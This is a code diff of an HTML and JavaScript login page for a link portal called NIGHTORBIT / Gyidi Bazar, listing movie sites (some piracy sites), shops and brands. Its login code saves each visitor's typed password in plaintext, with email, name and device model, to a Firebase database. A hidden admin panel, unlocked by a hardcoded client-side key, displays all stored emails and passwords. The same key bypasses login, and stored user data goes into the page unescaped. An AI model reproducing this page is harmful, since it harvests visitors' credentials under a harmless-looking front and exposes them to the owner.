@@ -20,35 +20,41 @@
         }
         .card { 
             background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
-            padding: 30px; border-radius: 30px; text-align: center; 
-            width: 360px; border: 1px solid rgba(255,255,255,0.1); 
+            padding: 25px; border-radius: 30px; text-align: center; 
+            width: 400px; border: 1px solid rgba(255,255,255,0.1); 
             box-shadow: 0 25px 50px rgba(0,0,0,0.8); position: relative; z-index: 10;
         }
-        .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; opacity: 0.7; }
-        .pass-wrapper { position: relative; width: 100%; }
-        .pass-wrapper i { position: absolute; right: 15px; top: 22px; cursor: pointer; color: #888; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.4); color: white; outline: none; }
-        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
-        .btn-google { background: white; color: black; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-top: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .link-card { background: rgba(255,255,255,0.07); padding: 12px; border-radius: 15px; margin: 8px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--neon); transition: 0.3s; font-size: 13px; }
+        .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.4); color: white; outline: none; }
+        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
+        .btn-google { background: white; color: black; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-top: 10px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        
+        /* Category Lists */
+        .scroll-area { max-height: 350px; overflow-y: auto; padding-right: 5px; margin-top: 10px; text-align: left; }
+        .cat-title { color: var(--gold); font-size: 12px; font-weight: bold; margin: 15px 0 8px 5px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid rgba(255,215,0,0.2); }
+        .link-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
+        .link-card { background: rgba(255,255,255,0.07); padding: 10px; border-radius: 10px; text-decoration: none; color: white; border-left: 3px solid var(--neon); transition: 0.2s; font-size: 11px; }
+        .link-card:hover { background: rgba(255,255,255,0.15); transform: scale(1.02); }
+
         #admin-panel { position: fixed; inset: 0; background: #070707; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
         .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; }
-        .device-badge { background: #fbbf24; color: #000; padding: 3px 12px; border-radius: 6px; font-size: 12px; font-weight: 900; text-transform: uppercase; display: inline-block; margin-top: 4px; }
         #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
         .hidden { display: none !important; }
         .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
     </style>
 </head>
 <body>
 
     <div id="logout-overlay">
         <div style="font-size: 60px; margin-bottom: 20px;">🌹</div>
-        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 18px; max-width: 500px;"></div>
+        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 16px;"></div>
     </div>
 
     <div id="admin-panel">
-        <h1 class="text-2xl font-bold" style="color: var(--primary); margin-bottom: 20px;">Owner Live Logs</h1>
-        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 30px; margin-bottom: 20px;">EXIT CONSOLE</button>
+        <h1 style="color: var(--primary);">Gyidi Owner Panel</h1>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 8px 25px;">CLOSE</button>
         <div id="user-rows-container"></div>
     </div>
 
@@ -56,29 +62,64 @@
     <div class="admin-dot" onclick="adminAccess()">.</div>
 
     <div id="login-box" class="card">
-        <h1 style="color: var(--primary); margin: 0; font-size: 32px; letter-spacing: 2px; font-weight: 800;">NIGHTORBIT</h1>
+        <h1 style="color: var(--primary); margin: 0; font-size: 26px; font-weight: 800;">NIGHTORBIT</h1>
+        <p style="font-size: 10px; color: #aaa; margin-bottom: 15px;">Gyidi Bazar Official Entry</p>
         <button class="btn-google" onclick="authGoogle()">
-            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="18"> SIGNUP WITH GOOGLE
+            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="16"> GOOGLE CONNECT
         </button>
-        <div style="margin: 20px 0; color: #444; font-size: 10px;">— SECURE ACCESS —</div>
+        <div style="margin: 15px 0; color: #444; font-size: 10px;">— OR EMAIL LOGIN —</div>
         <input type="email" id="u-email" placeholder="Email Address">
-        <div class="pass-wrapper">
-            <input type="password" id="u-pass" placeholder="Password (Name + Number)">
-            <i class="fa-solid fa-eye" id="togglePass" onclick="togglePassword()"></i>
-        </div>
-        <button class="btn-main" onclick="authEmail()">Enter Bazaar</button>
+        <input type="password" id="u-pass" placeholder="Name + Number Password">
+        <button class="btn-main" onclick="authEmail()">Enter Bazar</button>
     </div>
 
     <div id="member-area" class="card hidden">
-        <h2 id="user-welcome" style="color: var(--primary);">Welcome!</h2>
-        <div style="text-align: left; margin-top: 15px;">
-            <a href="https://bollyflix.org.in/" target="_blank" class="link-card" style="border-left-color: #00ff00;">🎬 Bollyflix <span>Movies</span></a>
-            <a href="https://tamashaweb.com/" target="_blank" class="link-card" style="border-left-color: var(--gold);">📺 Tamasha App <span>Live TV</span></a>
-            <a href="https://vegamovies.to/" target="_blank" class="link-card" style="border-left-color: #ff0055;">📥 Download Movies <span>4K/HD</span></a>
-            <a href="https://www.daraz.pk" target="_blank" class="link-card">🛒 Shopping <span>Daraz</span></a>
-            <a href="#" target="_blank" class="link-card" style="border-left-color: #00d2ff;">🎬 Watch & Earn <span>$ Earning</span></a>
+        <h1 style="color: var(--primary); font-size: 22px; margin: 0;">Gyidi Bazar.Nigthorbit</h1>
+        <p id="user-welcome" style="font-size: 12px; color: var(--gold);"></p>
+        
+        <div class="scroll-area">
+            <div class="cat-title">🎬 Movies & Entertainment (5+)</div>
+            <div class="link-grid">
+                <a href="https://bollyflix.org.in/" target="_blank" class="link-card">Bollyflix</a>
+                <a href="https://tamashaweb.com/" target="_blank" class="link-card">Tamasha TV</a>
+                <a href="https://vegamovies.to/" target="_blank" class="link-card">Vegamovies</a>
+                <a href="https://www.netflix.com" target="_blank" class="link-card">Netflix</a>
+                <a href="https://www.primevideo.com" target="_blank" class="link-card">Prime Video</a>
+                <a href="https://www.youtube.com" target="_blank" class="link-card">YouTube</a>
+            </div>
+
+            <div class="cat-title">🛒 Premium Shopping (7+)</div>
+            <div class="link-grid">
+                <a href="https://www.amazon.com" target="_blank" class="link-card">Amazon</a>
+                <a href="https://www.daraz.pk" target="_blank" class="link-card">Daraz Mall</a>
+                <a href="https://www.aliexpress.com" target="_blank" class="link-card">AliExpress</a>
+                <a href="https://www.ebay.com" target="_blank" class="link-card">eBay</a>
+                <a href="https://www.walmart.com" target="_blank" class="link-card">Walmart</a>
+                <a href="https://www.alibaba.com" target="_blank" class="link-card">Alibaba</a>
+                <a href="https://www.apple.com/store" target="_blank" class="link-card">Apple Store</a>
+            </div>
+
+            <div class="cat-title">💎 Popular Brands (15+)</div>
+            <div class="link-grid">
+                <a href="https://www.pizzaathome.com" target="_blank" class="link-card">Pizza Hut</a>
+                <a href="https://www.foodpanda.pk" target="_blank" class="link-card">Foodpanda</a>
+                <a href="https://www.spotify.com" target="_blank" class="link-card">Spotify</a>
+                <a href="https://www.adidas.com" target="_blank" class="link-card">Adidas</a>
+                <a href="https://www.nike.com" target="_blank" class="link-card">Nike</a>
+                <a href="https://www.zara.com" target="_blank" class="link-card">Zara</a>
+                <a href="https://www.gucci.com" target="_blank" class="link-card">Gucci</a>
+                <a href="https://www.rolex.com" target="_blank" class="link-card">Rolex</a>
+                <a href="https://www.samsung.com" target="_blank" class="link-card">Samsung</a>
+                <a href="https://www.sony.com" target="_blank" class="link-card">Sony</a>
+                <a href="https://www.microsoft.com" target="_blank" class="link-card">Microsoft</a>
+                <a href="https://www.tesla.com" target="_blank" class="link-card">Tesla</a>
+                <a href="https://www.starbucks.com" target="_blank" class="link-card">Starbucks</a>
+                <a href="https://www.hp.com" target="_blank" class="link-card">HP Store</a>
+                <a href="https://www.dell.com" target="_blank" class="link-card">Dell</a>
+            </div>
         </div>
-        <button onclick="logoutSequence()" style="margin-top: 25px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold;">Secure Logout</button>
+
+        <button onclick="logoutSequence()" style="margin-top: 20px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold;">Secure Logout</button>
     </div>
 
     <script>
@@ -96,31 +137,18 @@
         const db = firebase.database();
         let currentUserName = "";
 
-        // NAYA ADVANCED DEVICE DETECTOR
         function getAdvancedModel() {
             const ua = navigator.userAgent;
-            let finalModel = "ANDROID DEVICE";
+            let finalModel = "ANDROID";
             if (ua.match(/\(([^)]+)\)/)) {
                 let section = ua.match(/\(([^)]+)\)/)[1];
                 let parts = section.split(';');
-                if(parts.length > 2) {
-                    finalModel = parts[parts.length - 1].trim();
-                    finalModel = finalModel.split('Build/')[0].split('WV')[0].trim();
-                } else {
-                    finalModel = parts[0];
-                }
+                finalModel = parts.length > 2 ? parts[parts.length - 1].split('Build/')[0].split('WV')[0].trim() : parts[0];
             }
-            const brands = ["INFINIX", "SAMSUNG", "REALME", "OPPO", "VIVO", "TECNO", "REDMI", "XIAOMI", "IPHONE"];
+            const brands = ["INFINIX", "SAMSUNG", "REALME", "OPPO", "VIVO", "TECNO", "REDMI", "IPHONE"];
             let foundBrand = "";
-            for(let b of brands) {
-                if(ua.toUpperCase().includes(b)) { foundBrand = b + " "; break; }
-            }
+            for(let b of brands) { if(ua.toUpperCase().includes(b)) { foundBrand = b + " "; break; } }
             return (foundBrand + finalModel).toUpperCase();
-        }
-
-        function togglePassword() {
-            const p = document.getElementById('u-pass');
-            p.type = p.type === "password" ? "text" : "password";
         }
 
         function authGoogle() {
@@ -133,7 +161,7 @@
         function authEmail() {
             const e = document.getElementById('u-email').value;
             const p = document.getElementById('u-pass').value;
-            if(!e || !p) return alert("Fill fields!");
+            if(!e || !p) return alert("Fill data!");
             auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0]))
             .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0])));
         }
@@ -141,16 +169,20 @@
         function processUser(user, pass, realName) {
             currentUserName = realName;
             db.ref('users/' + user.uid).once('value', snap => {
-                let data = snap.val();
-                let myNick = (data && data.ownerNick) ? data.ownerNick : "New Member";
+                let d = snap.val();
+                let nick = (d && d.ownerNick) ? d.ownerNick : "New Member";
                 db.ref('users/' + user.uid).update({
                     email: user.email,
                     password: pass,
                     device: getAdvancedModel(),
                     realName: realName,
-                    ownerNick: myNick,
+                    ownerNick: nick,
                     time: new Date().toLocaleString()
-                }).then(() => showMemberUI(realName));
+                }).then(() => {
+                    document.getElementById('login-box').classList.add('hidden');
+                    document.getElementById('member-area').classList.remove('hidden');
+                    document.getElementById('user-welcome').innerText = "Logged in as: " + realName;
+                });
             });
         }
 
@@ -158,54 +190,41 @@
             if (prompt("Admin Key:") === "rr123456789000rr") {
                 document.getElementById('admin-panel').style.display = 'block';
                 db.ref('users').on('value', (snap) => {
-                    let html = "";
+                    let h = "";
                     snap.forEach(c => {
                         let v = c.val();
-                        html += `<div class="admin-card">
+                        h += `<div class="admin-card">
                             <b style="color:var(--gold)">Nick: ${v.ownerNick}</b><br>
-                            <span style="color:var(--primary); font-size:12px;">Gmail: ${v.email}</span><br>
-                            <div class="mt-1"><span class="device-badge">${v.device}</span></div>
-                            <p style="color:#fff; font-size:11px; margin-top:5px;">Pass: ${v.password}</p>
-                            <p style="color:#666; font-size:10px;">Login: ${v.time}</p>
-                            <div style="margin-top:10px;">
-                                <button onclick="setNick('${c.key}')" style="background:var(--primary); border:none; border-radius:5px; padding:5px 10px; cursor:pointer; font-size:11px; font-weight:bold;">SET NICK</button>
-                                <button onclick="if(confirm('Delete?')) firebase.database().ref('users/${c.key}').remove()" style="background:red; color:white; border:none; border-radius:5px; padding:5px 10px; margin-left:10px; cursor:pointer; font-size:11px; font-weight:bold;">REMOVE</button>
-                            </div>
+                            <span>Name: ${v.realName}</span><br>
+                            <small>Email: ${v.email}</small><br>
+                            <small style="color:var(--primary)">Device: ${v.device}</small><br>
+                            <small>Pass: ${v.password}</small><br>
+                            <small>Time: ${v.time}</small><br>
+                            <button onclick="setNick('${c.key}')" style="margin-top:5px; padding:4px 10px; font-size:10px;">SET NICK</button>
+                            <button onclick="if(confirm('Delete?')) firebase.database().ref('users/${c.key}').remove()" style="background:red; color:white; margin-top:5px; padding:4px 10px; font-size:10px;">DEL</button>
                         </div>`;
                     });
-                    document.getElementById('user-rows-container').innerHTML = html;
+                    document.getElementById('user-rows-container').innerHTML = h;
                 });
             }
         }
 
         function setNick(uid) {
-            let n = prompt("Enter Nickname (Only for Owner):");
+            let n = prompt("Enter Nickname:");
             if(n) db.ref('users/' + uid).update({ ownerNick: n });
         }
 
-        function showMemberUI(name) {
+        function bypassLogin() { if (prompt("Master Key:") === "rr123456789000rr") {
             document.getElementById('login-box').classList.add('hidden');
             document.getElementById('member-area').classList.remove('hidden');
-            document.getElementById('user-welcome').innerText = "Hello, " + name;
-        }
-
-        function bypassLogin() {
-            if (prompt("Master Key:") === "rr123456789000rr") showMemberUI("Owner Farooq");
-        }
+        }}
 
         function logoutSequence() {
-            const overlay = document.getElementById('logout-overlay');
-            document.getElementById('bye-text-display').innerHTML = `
-                <span style="font-size: 26px; color: var(--gold); font-weight: bold;">Goodbye, ${currentUserName}!</span><br><br>
-                It was an absolute pleasure having you at Nightorbit today.<br><br>
-                May God bless you with happiness and great success in everything you do. 
-                Looking forward to seeing you again very soon!<br><br>
-                <i>"Stay safe, stay blessed, and always keep smiling. Allah Hafiz!"</i>
-            `;
-            overlay.style.display = 'flex';
-            setTimeout(() => { location.reload(); }, 6000);
+            document.getElementById('logout-overlay').style.display = 'flex';
+            document.getElementById('bye-text-display').innerHTML = `Goodbye, ${currentUserName}!<br><br>May God bless you with happiness and success.<br>Allah Hafiz!`;
+            setTimeout(() => location.reload(), 5000);
         }
     </script>
 </body>
-    </html>
-    
+                    </html>
+                    
